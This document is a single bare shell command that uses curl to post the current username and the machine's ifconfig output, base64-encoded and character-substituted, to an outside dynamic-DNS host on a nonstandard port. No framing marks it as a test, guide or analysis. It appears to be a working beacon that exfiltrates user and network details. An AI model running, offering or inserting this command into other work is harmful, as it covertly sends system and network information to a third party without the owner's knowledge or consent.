curl "pipie.ddns.net:23232" -d "whoami=$(whoami)&ifconfig=$(/sbin/ifconfig | base64 -w 0 | tr -- '+=/' '-_~')"
